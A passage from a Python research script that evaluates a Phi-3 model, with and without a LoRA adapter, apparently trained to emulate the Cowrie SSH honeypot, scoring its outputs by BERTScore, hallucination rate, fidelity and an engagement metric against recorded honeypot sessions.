            bert_path = "/content/drive/MyDrive/roberta-large"

        # ── Model Setup ───────────────────────────────────────────────────
        if llm_cname == "lora_finetuned":
            if base_model.__class__.__name__ != "PeftModel":
                print(f"  [{cname}] Applying LoRA adapter → {ADAPTER_PATH}")
                model = PeftModel.from_pretrained(base_model, ADAPTER_PATH)
                base_model = model  # Store wrapped model so we don't wrap twice
            else:
                print(f"  [{cname}] LoRA adapter already applied.")
                model = base_model
        else:
            model = base_model
        model.eval()

        # ── Generation ────────────────────────────────────────────────────
        print(f"\n  [{cname}] Generation...")
        ckpt_gen_name = f"generation_{cname}" if cname == "lora_hallucinated_prompt" else f"generation_{llm_cname}"
        ckpt_gen = load_checkpoint(ckpt_gen_name, expected_dataset_size=ds_size)

        if ckpt_gen is not None:
            references   = ckpt_gen["references"]
            hypotheses   = ckpt_gen["hypotheses"]
            instructions = ckpt_gen["instructions"]
            print(f"  [{cname}] Resumed: {len(hypotheses)} samples.")
        else:
            references   = []
            hypotheses   = []
            instructions = []
            sp = HALLUCINATED_SYSTEM_PROMPT if cname == "lora_hallucinated_prompt" else SYSTEM_PROMPT
            prompts_all = [build_prompt(s["instruction"], sys_prompt=sp) for s in gt_samples]
            refs_all    = [s["output"].strip()            for s in gt_samples]
            instrs_all  = [s["instruction"]               for s in gt_samples]

            for b_start in tqdm(range(0, len(prompts_all), BATCH_SIZE),
                                desc=f"  [{cname}] Generating", unit="batch"):
                hyps = generate_batch(model, tokenizer,
                                       prompts_all[b_start: b_start + BATCH_SIZE],
                                       device)
                hypotheses  .extend(hyps)
                references  .extend(refs_all   [b_start: b_start + BATCH_SIZE])
                instructions.extend(instrs_all [b_start: b_start + BATCH_SIZE])

            save_checkpoint(ckpt_gen_name, {
                "references":   references,
                "hypotheses":   hypotheses,
                "instructions": instructions,
            }, dataset_size=ds_size)

        if cname == "base_model" and hypotheses:
            print("\n  [base_model] SAMPLE HYPOTHESES (for debugging 0% hallucination):")
            for idx in range(min(5, len(hypotheses))):
                print(f"   [Sample {idx+1}]")
                print(f"    - Instr: {repr(instructions[idx])}")
                print(f"    - Ref  : {repr(references[idx])}")
                print(f"    - Hyp  : {repr(hypotheses[idx])}")
                print(f"    - Leak?: {has_leakage(hypotheses[idx])}")
            print()

        # ── BERTScore ─────────────────────────────────────────────────────
        ckpt_bert = load_checkpoint(f"bertscore_{cname}",
                                     expected_dataset_size=ds_size)
        if ckpt_bert is not None:
            bert_r = ckpt_bert
            print(f"  [{cname}] BERTScore resumed.")
        else:
            print(f"  [{cname}] BERTScore hesaplanıyor... (using {bert_path})")
            bert_r = compute_bertscore(references, hypotheses, bert_model_path=bert_path)
            save_checkpoint(f"bertscore_{cname}", bert_r, dataset_size=ds_size)

        per_f1  = bert_r["per_sample_f1"]
        hall_r  = compute_hallucination(hypotheses, per_f1, HALLUCINATION_THRESHOLD)
        fid_r   = compute_fidelity(per_f1, hypotheses, CONSISTENCY_THRESHOLD)

        # ── AEI ───────────────────────────────────────────────────────────
        print(f"\n  [{cname}] AEI hesaplanıyor...")
        aei_sens, aei_sub, per_sess = compute_aei_for_condition(
            model, tokenizer, device,
            gt_data, cowrie_sessions,
            condition_hypotheses=hypotheses,
            instructions=instructions,
            dataset_size=ds_size,
            condition_name=cname,
            bert_model_path=bert_path,
        )

        all_results[cname] = {
            "condition":       cname,
            "bertscore": {
                "precision":     round(bert_r["precision"], 4),
                "recall":        round(bert_r["recall"],    4),
                "f1":            round(bert_r["f1"],        4),
                "per_sample_f1": [round(x, 4) for x in per_f1],
            },
            "hallucination": {k: v for k, v in hall_r.items()
                              if k not in ("hallucinated_indices",
                                           "clean_indices")},
            "fidelity":         fid_r,
            "aei_sensitivity":  aei_sens,
            "aei_subsets":      aei_sub,
        }

        print_condition_report(cname,
                               bert=all_results[cname]["bertscore"],
                               hall=all_results[cname]["hallucination"],
                               fid=all_results[cname]["fidelity"],
                               aei_sens=aei_sens, aei_sub=aei_sub)

        # ── Free VRAM ─────────────────────────────────────────────────────
        del model
        torch.cuda.empty_cache()
        print(f"  [{cname}] Model reference released, VRAM cache cleared.")

    del base_model, tokenizer
    torch.cuda.empty_cache()

    # ── Karşılaştırma & JSON ──────────────────────────────────────────────
    print_comparison_table(all_results)

    output_data = {
        "conditions": all_results,
        "config": {
            "model":                   MODEL_NAME,
            "adapter":                 ADAPTER_PATH,
            "dataset_size":            ds_size,
            "aei_session_count":       len(cowrie_sessions),
            "aei_formula":             "llm_cmd = cowrie_cmd * (1 + avg_quality); AEI = llm_dur / cowrie_dur",
            "threshold":               THRESHOLD,
            "threshold_note":          "single threshold, no grey zone; F1>=threshold→faithful, F1<threshold→hallucination",
            "conditions_description":  "base_model=Phi-3 without adapter; lora_finetuned=Phi-3 + phi3-cowrie-lora adapter",
            "bertscore_model":         "roberta-large",
            "bertscore_rescale":       True,
            "max_new_tokens":          MAX_NEW_TOKENS,
            "temperature":             TEMPERATURE,
            "seed":                    SEED,
        },
    }
    with open(OUTPUT_JSON, "w", encoding="utf-8") as f:
        json.dump(output_data, f, indent=2, ensure_ascii=False)

    print(f"\n  Results saved to: {OUTPUT_JSON}")
    hline()
    print("  Evaluation complete.")
    hline()
    print()


if __name__ == "__main__":
    main()